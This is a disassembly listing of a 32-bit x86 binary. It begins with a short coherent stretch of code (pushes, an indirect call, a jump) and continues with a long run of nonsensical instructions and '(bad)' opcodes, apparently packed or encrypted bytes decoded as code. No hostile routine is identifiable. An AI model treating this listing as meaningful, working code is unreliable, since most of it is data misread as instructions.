  403879:	mov    BYTE PTR [ecx],al
  40387b:	mov    eax,ds:0x42178e
  403880:	push   DWORD PTR [eax]
  403882:	push   DWORD PTR ds:0x4219ea
  403888:	push   DWORD PTR ds:0x421796
  40388e:	push   DWORD PTR ds:0x4219ca
  403894:	push   DWORD PTR ds:0x421a5e
  40389a:	push   DWORD PTR [ebp-0x30]
  40389d:	push   DWORD PTR [ebp-0x20]
  4038a0:	mov    eax,DWORD PTR [ebp-0x8]
  4038a3:	mov    eax,DWORD PTR [eax]
  4038a5:	mov    eax,DWORD PTR [eax]
  4038a7:	mov    eax,DWORD PTR [eax]
  4038a9:	call   eax
  4038ab:	mov    eax,DWORD PTR [ebp-0x34]
  4038ae:	mov    ecx,DWORD PTR ds:0x42198e
  4038b4:	add    DWORD PTR [eax],ecx
  4038b6:	jmp    0x405c6b
  4038bb:	fnstenv [edx-0x73]
  4038be:	xchg   ebp,eax
  4038bf:	gs xchg ebp,eax
  4038c1:	test   eax,0x7c0e640e
  4038c6:	sbb    ch,BYTE PTR [ebx+eiz*2]
  4038c9:	mov    ch,0xbc
  4038cb:	retf   0x625f
  4038ce:	(bad)  
  4038cf:	retf   0x625f
  4038d2:	bound  ebx,QWORD PTR [ecx+edi*4-0x6e]
  4038d6:	(bad)  
  4038d7:	fsubr  st,st(5)
  4038d9:	mov    ch,0xe0
  4038db:	loop   0x4038d8
  4038dd:	or     ebx,DWORD PTR [eax]
  4038df:	les    ecx,FWORD PTR [ecx]
  4038e1:	jo     0x403924
  4038e3:	cmp    BYTE PTR [esi+0x77a62a51],dl
  4038e9:	sbb    ecx,0x31
  4038ec:	sahf   
  4038ed:	sub    cl,BYTE PTR [edi]
  4038ef:	push   esi
  4038f0:	cs inc ebp
  4038f2:	push   cs
  4038f3:	jecxz  0x403904
  4038f5:	fwait
  4038f6:	mov    bl,0x5a
  4038f8:	xor    al,0x32
  4038fa:	ret    0x1b9c
  4038fd:	dec    ecx
  4038fe:	mov    edi,0xb4ffe7ef
  403903:	cmp    eax,0x8894dd66
  403908:	js     0x403989
  40390a:	adc    edi,DWORD PTR [eax+0x19]
  40390d:	push   edi
  40390e:	mov    esi,0xae2e468f
  403913:	xor    BYTE PTR [ebx],ch
  403915:	or     ebp,DWORD PTR [ebx]
  403917:	and    al,0xad
  403919:	outs   dx,DWORD PTR ds:[esi]
  40391a:	rcr    DWORD PTR [edx+eiz*1],cl
  40391d:	outs   dx,DWORD PTR ds:[esi]
  40391e:	and    bl,BYTE PTR [ebp+0x7a]
  403921:	jbe    0x40395b
  403923:	ja     0x40399f
  403925:	xchg   ecx,eax
  403926:	jbe    0x40393b
  403928:	inc    edi
  403929:	cmp    esi,edi
  40392b:	mov    edx,DWORD PTR [eax+ebx*1-0x6d]
  40392f:	mov    esi,0x25db2f25
  403934:	push   ds
  403935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403936:	clc    
  403937:	cld    
  403938:	dec    edx
  403939:	(bad)  
  40393a:	int3   
  40393b:	and    eax,0x1d5f5ba0
  403940:	pop    eax
  403941:	mov    esp,0x1557ec1e
  403946:	dec    edi
  403947:	xchg   DWORD PTR [eax+0x1c],esp
  40394a:	inc    edi
  40394b:	mov    edx,0x9a898137
  403950:	jle    0x4039cf
  403952:	push   esi
  403953:	call   0x456:0x56b65ae4
  40395a:	cwde   
  40395b:	jne    0x4038e6
  40395d:	sub    DWORD PTR [esi-0x24776901],ebp
  403963:	mov    DWORD PTR [ebx-0x28cf0dc4],edx
  403969:	push   0xffffffaf
  40396b:	sbb    eax,0xc7dceb1f
  403970:	ret    
  403971:	retf   0x8b20
  403974:	xlat   BYTE PTR ds:[ebx]
  403975:	inc    esi
  403976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403977:	push   ebp
  403978:	enter  0x5b75,0x87
  40397c:	popa   
  40397d:	push   es
  40397e:	lds    edx,FWORD PTR [ecx+0x7ceaadf2]
  403984:	and    ecx,DWORD PTR ds:[ebp-0x3b3a9b91]
  40398b:	lock jae 0x4039ef
  40398e:	jmp    0x6ad68eec
  403993:	cmp    eax,0xffffffbe
  403996:	cmp    eax,ebp
  403998:	jp     0x40394d
  40399a:	mov    al,BYTE PTR [ecx]
  40399c:	(bad)  
  40399d:	mov    eax,0x9d773c2c
  4039a2:	imul   DWORD PTR [edx+0x4]
  4039a5:	adc    edx,ebx
  4039a7:	popf   
  4039a8:	and    dl,al
  4039aa:	idiv   BYTE PTR [edi+0x3e72a50c]
  4039b0:	and    BYTE PTR [ebp+ecx*2-0x36],al
  4039b4:	fucomi st,st(7)
  4039b6:	push   es
  4039b7:	cmp    eax,0x3a1da677
  4039bc:	xchg   edx,eax
  4039bd:	outs   dx,DWORD PTR ds:[esi]
  4039be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039bf:	nop
  4039c0:	xor    BYTE PTR [eax-0x76],0x7d
  4039c4:	sti    
  4039c5:	inc    edi
  4039c6:	loop   0x4039bb
  4039c8:	mov    bh,0x5b
  4039ca:	shl    esp,cl
  4039cc:	das    
  4039cd:	popa   
  4039ce:	sub    bh,al
  4039d0:	push   edx
  4039d1:	cmp    DWORD PTR [ecx-0x5f],0x6400e1
  4039d8:	cwde   
  4039d9:	popf   
  4039da:	jne    0x403a59
  4039dc:	push   ds
  4039dd:	sbb    ah,cl
  4039df:	xor    ebp,esi
  4039e1:	imul   eax,DWORD PTR [edx+0x3e],0x60
  4039e5:	mov    bl,0xcc
  4039e7:	sub    al,0x6e
  4039e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039ea:	adc    DWORD PTR [ecx+0x5a],0x34f8a522
  4039f1:	sahf   
  4039f2:	lahf   
  4039f3:	ds dec esp
  4039f5:	ror    dh,cl
  4039f7:	push   es
  4039f8:	cmp    al,BYTE PTR [edi]
  4039fa:	ret    
  4039fb:	out    0x46,eax
  4039fd:	add    BYTE PTR [edi],dl
  4039ff:	xor    al,0x84
  403a01:	push   cs
  403a02:	test   eax,0x2d5bc69e
  403a07:	icebp  
  403a08:	(bad)
  403a0b:	stos   DWORD PTR es:[edi],eax
  403a0c:	xor    ah,dh
  403a0e:	imul   ebp,eax,0xcdb033a3
  403a14:	fild   DWORD PTR [ebp-0x45569f]
  403a1a:	or     eax,0x2e16265f
  403a1f:	clc    
  403a20:	sti    
  403a21:	scas   eax,DWORD PTR es:[edi]
  403a22:	ror    BYTE PTR [edx+eax*4-0x21],cl
  403a26:	adc    DWORD PTR [ebp-0x12],ebx
  403a29:	ror    DWORD PTR [esi+0x37],cl
  403a2c:	pop    ds
  403a2d:	add    bh,BYTE PTR [ebx]
  403a2f:	dec    edi
  403a30:	lock iret 
  403a32:	jge    0x403a2e
  403a34:	clc    
  403a35:	add    DWORD PTR [edi+ecx*4-0x7bc6ca8d],edx
  403a3c:	data16 icebp 
  403a3e:	je     0x4039e6
  403a40:	js     0x403a7b
  403a42:	mov    ds:0x281ad57e,al
  403a47:	sar    DWORD PTR [ecx],cl
  403a49:	popf   
  403a4a:	scas   eax,DWORD PTR es:[edi]
  403a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a4c:	pop    ecx
  403a4d:	out    dx,al
  403a4e:	jp     0x403a21
  403a50:	xchg   ebp,eax
  403a51:	loope  0x403a3e
  403a53:	shl    DWORD PTR [ebx-0x69518f84],1
  403a59:	scas   eax,DWORD PTR es:[edi]
  403a5a:	mov    DWORD PTR [eax+0x34],ebx
  403a5d:	or     al,0x8b
  403a5f:	std    
  403a60:	les    edi,FWORD PTR [ebp+ebx*8-0x45]
  403a64:	imul   ebp,DWORD PTR [edi+0x3f],0x414c0c00
  403a6b:	inc    eax
  403a6c:	les    esp,FWORD PTR [ebp+0x44]
  403a6f:	in     eax,0xd8
  403a71:	loope  0x403a25
  403a73:	jne    0x403a78
  403a75:	cdq    
  403a76:	dec    edi
  403a77:	cmp    eax,0x787409bf
  403a7c:	enter  0xa55d,0x2c
  403a80:	adc    eax,0xb4cb9fce
  403a85:	sub    al,0x57
  403a87:	in     eax,0x2e
  403a89:	(bad)  [edi+0x180c5289]
  403a8f:	xlat   BYTE PTR ds:[ebx]
  403a90:	iret   
  403a91:	ret    
  403a92:	fstp   DWORD PTR [esi]
  403a94:	arpl   WORD PTR [ebx+esi*4+0x7b],ax
  403a98:	and    al,0x5f
  403a9a:	mov    ds:0x4228600c,eax
  403a9f:	mov    ch,0x3
  403aa1:	rcl    eax,0x5c
  403aa4:	mov    ah,0xcc
  403aa6:	out    dx,al
  403aa7:	into   
  403aa8:	stos   BYTE PTR es:[edi],al
  403aa9:	mov    dh,0x6d
  403aab:	sub    al,0xc9
  403aad:	test   al,0x27
  403aaf:	push   edx
  403ab0:	push   edx
  403ab1:	mov    ds:0xc10b6ef3,al
  403ab6:	cmp    BYTE PTR [edi-0x4bb53367],ah
  403abc:	xor    al,0xd8
  403abe:	loopne 0x403aa3
  403ac0:	aaa    
  403ac1:	mov    dh,0x71
  403ac3:	pop    edx
  403ac4:	test   eax,0x2b83e0ba
  403ac9:	jmp    0x403ad6
  403acb:	push   edi
  403acc:	lods   eax,DWORD PTR ds:[esi]
  403acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ace:	mov    WORD PTR [eax+0x68],ds
  403ad1:	and    BYTE PTR [edi+edi*8],ah
  403ad4:	in     al,dx
  403ad5:	(bad)  
  403ad6:	pusha  
  403ad7:	push   esp
  403ad8:	xchg   esp,eax
  403ad9:	or     DWORD PTR [esi-0x5],ecx
  403adc:	push   ebp
  403add:	jg     0x403a99
  403adf:	call   0x2139bca1
  403ae4:	cld    
  403ae5:	jmp    0x403a79
  403ae7:	jne    0x403ab4
  403ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403aea:	sti    
  403aeb:	pop    ebx
  403aec:	cmp    eax,0xe9742fba
  403af1:	je     0x66275b4f
  403af7:	mov    al,ds:0xb955781b
  403afc:	xor    al,0x23
  403afe:	(bad)  
  403aff:	iret   
  403b00:	(bad)  
  403b01:	push   ds
  403b02:	mov    ds:0x4ea8d3bc,eax
  403b07:	xor    DWORD PTR [edx+0x778d678f],0x9a4a2df0
  403b11:	and    eax,0x6f07cc39
  403b16:	dec    eax
  403b17:	dec    ebx
  403b18:	sub    DWORD PTR [ebp+ebx*8-0x55],0xa2d2c729
  403b20:	out    0x5d,al
  403b22:	push   ebx
  403b24:	aaa    
  403b25:	ss fs push edx
  403b28:	pop    esi
  403b29:	fwait
  403b2a:	or     bh,bh
  403b2c:	inc    esi
  403b2d:	js     0x403b42
  403b2f:	inc    esp
  403b30:	mov    ebp,0x583d7d3b
  403b35:	test   DWORD PTR [ecx],ebx
  403b37:	retf   0x6a9b
  403b3a:	arpl   WORD PTR [edx+0xf],bp
  403b3d:	ss push ebp
  403b3f:	rcl    DWORD PTR [eax-0x1b],cl
  403b42:	out    dx,al
  403b43:	pop    DWORD PTR [ecx]
  403b45:	outs   dx,DWORD PTR ds:[esi]
  403b46:	out    dx,al
  403b47:	dec    eax
  403b48:	mov    eax,0x6ac34acb
  403b4d:	add    dl,BYTE PTR [ebx]
  403b4f:	xchg   edi,eax
  403b50:	sbb    esp,DWORD PTR ds:0xca5a1469
  403b56:	mov    dh,0x5b
  403b58:	xchg   edi,eax
  403b59:	(bad)  
  403b5a:	adc    BYTE PTR [ecx+0x79d8db91],ah
  403b60:	inc    esi
  403b61:	lods   al,BYTE PTR ds:[esi]
  403b62:	dec    edx
  403b63:	sbb    bl,al
  403b65:	test   BYTE PTR [ecx],0xad
  403b68:	arpl   WORD PTR [edi],dx
  403b6a:	xchg   ebx,eax
  403b6b:	fxch   st(5)
  403b6d:	pop    eax
  403b6e:	and    al,0x8f
  403b70:	jns    0x403b42
  403b72:	repnz sub DWORD PTR [edi-0x1e79dad0],eax
  403b79:	jbe    0x403bf6
  403b7b:	sub    BYTE PTR [edi],0x94
  403b7e:	dec    edi
  403b7f:	arpl   WORD PTR [ecx-0x69e2102d],cx
  403b85:	push   edi
  403b86:	jmp    FWORD PTR [ecx]
  403b88:	lock push ebp
  403b8a:	mov    dh,0x52
  403b8c:	(bad)  
  403b8d:	xor    ecx,ebp
  403b8f:	push   0x46
  403b91:	nop
  403b92:	shr    BYTE PTR [ecx],cl
  403b94:	pop    ds
  403b95:	pop    esp
  403b96:	rcl    BYTE PTR [edx*1+0x1d4b0e0a],0x8c
  403b9e:	(bad)  
  403b9f:	xchg   ecx,eax
  403ba0:	pop    edx
  403ba1:	sbb    DWORD PTR [ecx-0x2a273c],edx
  403ba7:	pusha  
  403ba8:	je     0x403b5f
  403baa:	call   0xd3894336
  403baf:	(bad)  
  403bb0:	mov    al,0xa
  403bb2:	xlat   BYTE PTR ds:[ebx]
  403bb3:	dec    eax
  403bb4:	adc    eax,0x2c528eb4
  403bb9:	pop    edx
  403bba:	adc    DWORD PTR [esi+0x454faa49],0xffffff9a
  403bc1:	cli    
  403bc2:	mov    esp,0x24ea4937
  403bc7:	sub    ecx,esp
  403bc9:	push   esi
  403bca:	add    al,0xdb
  403bcc:	dec    esi
  403bcd:	ror    BYTE PTR [esi-0x1800c6f5],cl
  403bd3:	fsubr  QWORD PTR [edi]
  403bd5:	or     BYTE PTR [esi-0x4c846d9c],dl
  403bdb:	sub    eax,DWORD PTR [edx+0x77ff2da0]
  403be1:	cmp    DWORD PTR [ebp+0x42],ebx
  403be4:	and    ah,BYTE PTR [ebp+0x59]
  403be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403be8:	retf   0x5ee5
  403beb:	jge    0x403c5a
  403bed:	push   es
  403bee:	or     BYTE PTR [eax],ah
  403bf0:	fidiv  WORD PTR [ebx]
  403bf2:	in     eax,dx
  403bf3:	hlt    
  403bf4:	popa   
  403bf5:	sub    cl,BYTE PTR [ecx]
  403bf7:	inc    ebp
  403bf8:	add    eax,DWORD PTR [edi]
  403bfa:	sub    al,0xeb
  403bfc:	add    al,0x2b
  403bfe:	scas   eax,DWORD PTR es:[edi]
  403bff:	iret   
  403c00:	mov    esp,esi
  403c02:	cwde   
  403c03:	mov    edi,esi
  403c05:	push   ds
  403c06:	dec    esp
  403c07:	aam    0xd1
  403c09:	sbb    DWORD PTR ds:0x8b648882,esi
  403c0f:	add    bl,BYTE PTR [ebp+0x36]
  403c12:	mov    edi,0x935b5d35
  403c17:	xchg   DWORD PTR [edi+0x20f8ae9b],eax
  403c1d:	or     BYTE PTR [ecx+0x4a],cl
  403c20:	push   ecx
  403c21:	xor    al,0x66
  403c23:	and    edx,edi
  403c25:	add    DWORD PTR [edi-0x25],ecx
  403c28:	outs   dx,BYTE PTR ds:[esi]
  403c29:	pop    eax
  403c2a:	cmp    BYTE PTR [ebp+0x73],0x97
  403c2e:	mov    ch,al
  403c30:	rcl    BYTE PTR [ebx+0x6699ff96],1
  403c36:	xchg   BYTE PTR [ecx],ah
  403c38:	dec    eax
  403c39:	icebp  
  403c3a:	in     al,0x4f
  403c3c:	cs repnz push 0x43
  403c40:	xor    eax,0x427fb226
  403c45:	xchg   esi,eax
  403c46:	js     0x403c6c
  403c48:	push   edi
  403c49:	cld    
  403c4a:	ins    BYTE PTR es:[edi],dx
  403c4b:	ret    
  403c4c:	into   
  403c4d:	aaa    
  403c4e:	aad    0xba
  403c50:	rcr    edi,1
  403c52:	mov    ecx,0x8ebc4c62
  403c57:	dec    ebp
  403c58:	pop    es
  403c59:	scas   al,BYTE PTR es:[edi]
  403c5a:	out    dx,eax
  403c5b:	jecxz  0x403c9b
  403c5d:	shl    BYTE PTR [ebx],1
  403c5f:	mov    eax,ds:0xf5d92743
  403c64:	xor    edx,esp
  403c66:	push   DWORD PTR [edx-0x6c]
  403c69:	loop   0x403cd0
  403c6b:	dec    ecx
  403c6c:	cwde   
  403c6d:	push   ss
  403c6e:	xchg   edi,eax
  403c6f:	mov    bl,0xe2
  403c71:	scas   al,BYTE PTR es:[edi]
  403c72:	test   BYTE PTR [esi-0x45],cl
  403c75:	or     al,0xf7
  403c77:	xchg   ecx,eax
  403c78:	dec    ebp
  403c79:	shr    BYTE PTR [ebx-0x76a7722],1
  403c7f:	aas    
  403c80:	ror    DWORD PTR [edi],1
  403c82:	and    ebp,edi
  403c84:	or     DWORD PTR [edi-0x4566b979],edi
  403c8a:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c8c:	and    BYTE PTR [eax],dl
  403c8e:	into   
  403c8f:	pop    ds
  403c90:	mov    ds:0xa6ed9dc7,al
  403c95:	out    dx,al
  403c96:	pop    ebx
  403c97:	enter  0x33fa,0x32
  403c9b:	hlt    
  403c9c:	sub    BYTE PTR [ecx],0x1c
  403c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ca0:	mov    dh,0x9f
  403ca3:	cli    
  403ca4:	and    edx,DWORD PTR [eax-0x1]
  403ca7:	inc    eax
  403ca8:	fdivr  st,st(4)
  403caa:	retf   
  403cab:	adc    edi,DWORD PTR [esi-0x29]
  403cae:	xor    eax,0xd0dcd0d3
  403cb3:	int3   
  403cb4:	cmp    ebp,DWORD PTR [edi+0x9]
  403cb7:	leave  
  403cb8:	cmp    DWORD PTR [ebp+0x2eb7be63],0x750cbef6
  403cc2:	lods   al,BYTE PTR ds:[esi]
  403cc3:	aaa    
  403cc4:	push   ebp
  403cc5:	lahf   
  403cc6:	cmp    eax,0x93920406
  403ccb:	or     dh,BYTE PTR [esi+0x55ffbac]
  403cd1:	or     edx,ebx
  403cd3:	mov    edi,0xd196263d
  403cd8:	into   
  403cd9:	fnstcw WORD PTR [esi]
  403cdb:	aad    0xea
  403cdd:	aas    
  403cde:	dec    edi
  403cdf:	cmp    eax,0xf2e34b16
  403ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ce5:	inc    edi
  403ce6:	jge    0x403d0d
  403ce8:	lea    eax,[ebx-0x542f4465]
  403cee:	inc    esp
  403cef:	(bad)  
  403cf0:	fcomi  st,st(4)
  403cf2:	out    dx,al
  403cf3:	je     0x403d3f
  403cf5:	aad    0x3c
  403cf7:	and    eax,0xeeb46cc7
  403cfc:	mov    cl,cl
  403cfe:	add    esi,ecx
  403d00:	xlat   BYTE PTR ds:[ebx]
  403d01:	dec    edi
  403d02:	mov    dl,0x28
  403d04:	dec    esi
  403d05:	sub    eax,0xa92efb1e
  403d0a:	xchg   edx,eax
  403d0b:	sbb    al,0x49
  403d0d:	(bad)  
  403d0e:	and    esi,DWORD PTR [eax]
  403d10:	pop    es
  403d11:	sub    eax,0xa995fa61
  403d16:	call   0xb64065eb
  403d1b:	and    bh,0x41
  403d1e:	xchg   ebp,eax
  403d1f:	jno    0x403ce9
  403d21:	add    BYTE PTR ds:0x7ae980b7,bh
  403d27:	in     al,dx
  403d28:	dec    esp
  403d29:	pop    edx
  403d2a:	hlt    
  403d2b:	mov    ds:0x19e221b0,al
  403d30:	in     al,0x6a
  403d32:	fild   WORD PTR [ecx]
  403d34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d35:	sub    eax,0x12f07b96
  403d3a:	xor    BYTE PTR [ebx-0x48],al
  403d3d:	dec    ecx
  403d3e:	gs call 0x841be043
  403d44:	stc    
  403d45:	xor    al,0xbe
  403d47:	je     0x403d51
  403d49:	in     eax,dx
  403d4a:	xor    al,0x7f
  403d4c:	test   eax,ecx
  403d4e:	stc    
  403d4f:	xchg   BYTE PTR [ebp+0x2603cee1],ah
  403d55:	leave  
  403d56:	ss xchg edi,eax
  403d58:	sbb    BYTE PTR [esp+esi*4+0x3b480696],dh
  403d5f:	mov    ebx,0x9b6a5c0b
  403d64:	push   cs
  403d65:	mov    dl,0xfe
  403d67:	in     al,dx
  403d68:	push   ss
  403d69:	and    eax,0xd70ddd1b
  403d6e:	lock add ebx,DWORD PTR [ebx-0x52]
  403d72:	xor    eax,edi
  403d74:	inc    edi
  403d75:	or     bh,BYTE PTR [esi+0x51]
  403d78:	mov    esi,0xc1092eae
  403d7d:	fistp  DWORD PTR [eax+0x1e]
  403d80:	rcr    BYTE PTR ds:0xc4e840bc,1
  403d86:	gs stos BYTE PTR es:[edi],al
  403d88:	xor    ah,BYTE PTR [esi+0x5e58b6c0]
  403d8e:	add    cl,BYTE PTR [esi]
  403d90:	lods   eax,DWORD PTR ds:[esi]
  403d91:	fs lahf 
  403d93:	hlt    
  403d94:	mov    ch,0x81
  403d96:	loope  0x403d87
  403d98:	loop   0x403df2
  403d9a:	xchg   ebp,ecx
  403d9c:	sub    ah,bl
  403d9e:	mov    DWORD PTR [ebx+0x6229490f],edi
  403da4:	sbb    eax,0x5a6cb417
  403da9:	in     eax,dx
  403daa:	mov    WORD PTR [eax],?
  403dac:	je     0x403de7
  403dae:	xchg   esp,eax
  403daf:	out    dx,al
  403db0:	je     0x403e16
  403db2:	push   ebx
  403db3:	aaa    
  403db4:	sub    BYTE PTR [edi+0x700dd9da],dl
  403dba:	mov    ax,gs
  403dbd:	les    edx,FWORD PTR [ebp-0x470a2aa2]
  403dc3:	mov    dl,0x5a
  403dc5:	sahf   
  403dc6:	push   esp
  403dc7:	das    
  403dc8:	mov    eax,0x6aa7f363
  403dcd:	repnz cmp al,0xe0
  403dd0:	pop    esp
  403dd1:	scas   eax,DWORD PTR es:[edi]
  403dd2:	xor    al,0xe3
  403dd4:	and    al,0xb0
  403dd6:	sub    ecx,DWORD PTR [edi-0x11]
  403dd9:	add    eax,0xf15362b3
  403dde:	inc    ebx
  403ddf:	in     al,dx
  403de0:	pop    ecx
  403de1:	pop    edi
  403de2:	mov    ecx,0xcb9e0c8b
  403de7:	loop   0x403df3
  403de9:	xchg   DWORD PTR [ebp-0x567146d3],edi
  403def:	clc    
  403df0:	jp     0x403da9
  403df2:	aad    0xe5
  403df4:	outs   dx,DWORD PTR ds:[esi]
  403df5:	mov    al,0xee
  403df7:	xchg   BYTE PTR [eax+0x6868e595],al
  403dfd:	jae    0x403dbc
  403dff:	and    BYTE PTR [esi],al
  403e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e02:	gs mov bh,0xe2
  403e05:	ja     0x403e40
  403e07:	loop   0x403dad
  403e09:	sub    eax,0x79cea154
  403e0e:	xor    edx,DWORD PTR [edi-0x20]
  403e11:	mov    ?,WORD PTR [eax-0x25]
  403e14:	cmp    ecx,ebp
  403e16:	mov    WORD PTR [ebx+0x295a05c],cs
  403e1c:	dec    ecx
  403e1d:	stos   BYTE PTR es:[edi],al
  403e1e:	aad    0xfb
  403e20:	inc    ebp
  403e21:	lods   al,BYTE PTR ds:[esi]
  403e22:	and    DWORD PTR [eax],ebx
  403e24:	inc    esp
  403e25:	or     eax,0x7838c8e9
  403e2a:	push   ebp
  403e2b:	cmp    bl,BYTE PTR [esi-0x5622cc79]
  403e31:	jle    0x403e6e
  403e33:	popw   ds
  403e35:	mov    esi,0x5ccac4e2
  403e3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e3b:	inc    eax
  403e3c:	retf   0xc0bc
  403e3f:	mov    esi,0xa64bfac3
  403e44:	pushf  
  403e45:	int    0x32
  403e47:	bound  edi,QWORD PTR [eax+ecx*1+0x6f]
  403e4b:	fcmove st,st(2)
  403e4d:	pop    es
  403e4e:	daa    
  403e4f:	dec    edx
  403e50:	xchg   esp,eax
  403e51:	inc    esi
  403e52:	test   eax,0x5fe49dd0
  403e57:	sbb    DWORD PTR [esi-0x5036ab6d],0x1d
  403e5e:	adc    DWORD PTR [ebp+0x32],0x37cbe2f5
  403e65:	mov    es,WORD PTR [edx-0x60]
  403e68:	xchg   esp,eax
  403e69:	inc    esp
  403e6a:	test   BYTE PTR [ebx+0x55],bh
  403e6d:	fcomp  DWORD PTR [edx]
  403e6f:	pop    esp
  403e70:	jmp    0x403e72
  403e72:	cmp    BYTE PTR [edx],cl
  403e74:	mov    BYTE PTR [ecx-0x4],dl
  403e77:	jecxz  0x403e37
  403e79:	dec    ecx
  403e7a:	adc    eax,0x939fdd9d
  403e7f:	(bad)  
  403e80:	and    eax,0x4480971d
  403e85:	inc    ebx
  403e86:	(bad)  
  403e87:	outs   dx,DWORD PTR ds:[esi]
  403e88:	mov    gs,WORD PTR [ebx+0x711bb15a]
  403e8e:	adc    WORD PTR [ebp-0x3a],di
  403e92:	test   dh,ch
  403e94:	push   ds
  403e95:	and    BYTE PTR [edx+ebp*2-0x7d],bh
  403e99:	mov    bh,al
  403e9b:	cmp    eax,0x226f7e52
  403ea0:	(bad)  
  403ea1:	jae    0x403ea8
  403ea3:	fwait
  403ea4:	and    al,0x20
  403ea6:	mov    ds:0xedc11925,al
  403eab:	sbb    edi,eax
  403ead:	in     eax,0x8b
  403eaf:	mov    al,ds:0xc3c1f17d
  403eb4:	inc    ecx
  403eb5:	xlat   BYTE PTR ds:[ebx]
  403eb6:	cmp    al,0x92
  403eb8:	mov    edi,0xfb99138f
  403ebd:	pop    ecx
  403ebe:	int3   
  403ebf:	mov    eax,0x37c0913d
  403ec4:	jmp    0x403e8a
  403ec6:	mov    ?,WORD PTR [edi-0x43]
  403ec9:	mov    dx,WORD PTR [ecx+eiz*1]
  403ecd:	dec    edx
  403ece:	and    DWORD PTR [ecx+0xe],0xffffff9a
  403ed2:	push   0xc95843cf
  403ed7:	jnp    0x403f2f
  403ed9:	nop
  403eda:	pop    edi
  403edb:	lea    ebx,[esp+ebx*1-0x13]
  403edf:	lods   eax,DWORD PTR ds:[esi]
  403ee0:	cli    
  403ee1:	inc    ecx
  403ee2:	repnz mov al,0xd4
  403ee5:	mov    bh,BYTE PTR [edx]
  403ee7:	std    
  403ee8:	sbb    esp,DWORD PTR ds:0x3485dcb3
  403eee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403eef:	add    DWORD PTR [ebp+ebx*1-0x567bf2b4],esi
  403ef6:	dec    esi
  403ef7:	inc    ebp
  403ef8:	call   0x7e8a:0x987f0544
  403eff:	add    BYTE PTR [edi],0x1f
  403f02:	mov    al,0x2e
  403f04:	jne    0x403eb9
  403f06:	jge    0x403e9a
  403f08:	lahf   
  403f09:	jne    0x403ed2
  403f0b:	outs   dx,DWORD PTR ds:[esi]
  403f0c:	iret   
  403f0d:	jp     0x403f67
  403f0f:	push   esp
  403f10:	add    ecx,DWORD PTR [ebx]
  403f12:	push   cs
  403f13:	jb     0x403f83
  403f15:	jecxz  0x403f4f
  403f17:	mov    ebx,0x78b593ac
  403f1c:	std    
  403f1d:	loopne 0x403f47
  403f1f:	sub    ah,BYTE PTR [eax]
  403f21:	test   ch,bh
  403f23:	cld    
  403f24:	cmp    BYTE PTR [edi-0x7b],bl
  403f27:	test   al,0x47
  403f29:	ins    BYTE PTR es:[edi],dx
  403f2a:	and    dh,ah
  403f2c:	push   esi
  403f2d:	xchg   DWORD PTR [ecx],esi
  403f2f:	into   
  403f30:	enter  0x6b15,0x76
  403f34:	xchg   edi,eax
  403f35:	mov    ebx,0x973b6941
  403f3a:	mov    esp,?
  403f3c:	jnp    0x403ef7
  403f3e:	popf   
  403f3f:	scas   eax,DWORD PTR es:[edi]
  403f40:	cld    
  403f41:	inc    ebp
  403f42:	fbstp  TBYTE PTR [esi+0x61]
  403f45:	jb     0x403ef8
  403f47:	sar    BYTE PTR [eax],0xb0
  403f4a:	or     ch,BYTE PTR [edi]
  403f4c:	dec    edx
  403f4d:	inc    esp
  403f4e:	and    cl,BYTE PTR [ecx-0x7cb67395]
  403f54:	dec    ecx
  403f55:	push   es
  403f56:	add    BYTE PTR [eax],0xb9
  403f59:	jmp    0x59b7dbe2
  403f5e:	sti    
  403f5f:	jo     0x403fd1
  403f61:	scas   eax,DWORD PTR es:[edi]
  403f62:	sar    DWORD PTR [esi+ecx*2-0x5cfe5da2],cl
  403f69:	loope  0x403f04
  403f6b:	push   ecx
  403f6c:	xchg   esi,eax
  403f6d:	or     al,0x47
  403f6f:	das    
  403f70:	xor    cl,BYTE PTR [edi+0x60]
  403f73:	mov    bl,0xda
  403f75:	and    DWORD PTR [ebx+0x7f7b3dc4],esp
  403f7b:	loop   0x403fbf
  403f7d:	ja     0x403f24
  403f7f:	jle    0x403f95
  403f81:	jp     0x403fba
  403f83:	pmaxsw mm7,QWORD PTR [ebx-0x4ad94db3]
  403f8a:	loope  0x403f82
  403f8c:	popf   
  403f8d:	sbb    eax,ecx
  403f8f:	push   ebx
  403f90:	cmp    bh,BYTE PTR [edx]
  403f92:	sahf   
  403f93:	(bad)
  403f96:	fidivr DWORD PTR [ecx]
  403f98:	mov    eax,0xe50eec1a
  403f9d:	fisttp WORD PTR [ecx-0x2c2b576f]
  403fa3:	sar    BYTE PTR [edx],0x6e
  403fa6:	adc    dl,BYTE PTR [ebx+eiz*1+0x55]
  403faa:	xor    al,0x50
  403fac:	pop    ss
  403fad:	cld    
  403fae:	dec    edx
  403faf:	adc    ecx,DWORD PTR [ebp+eax*8+0x467a30e4]
  403fb6:	es dec ebx
  403fb8:	inc    esp
  403fb9:	ins    BYTE PTR es:[edi],dx
  403fba:	dec    ebx
  403fbb:	out    0xae,eax
  403fbd:	inc    eax
  403fbe:	jp     0x40401c
  403fc0:	out    0xba,al
  403fc2:	inc    ebx
  403fc3:	scas   al,BYTE PTR es:[edi]
  403fc4:	loope  0x403f6b
  403fc6:	jns    0x403f8d
  403fc8:	gs js  0x404018
  403fcb:	lods   al,BYTE PTR ds:[esi]
  403fcc:	push   0xfffffff6
  403fce:	ss mov edx,0xe5cedf8a
  403fd4:	ss mov BYTE PTR cs:[esi+0x4c],0x35
  403fda:	shl    dl,1
  403fdc:	pop    ebx
  403fdd:	or     edx,edx
  403fdf:	int    0xa5
  403fe1:	lods   al,BYTE PTR ds:[esi]
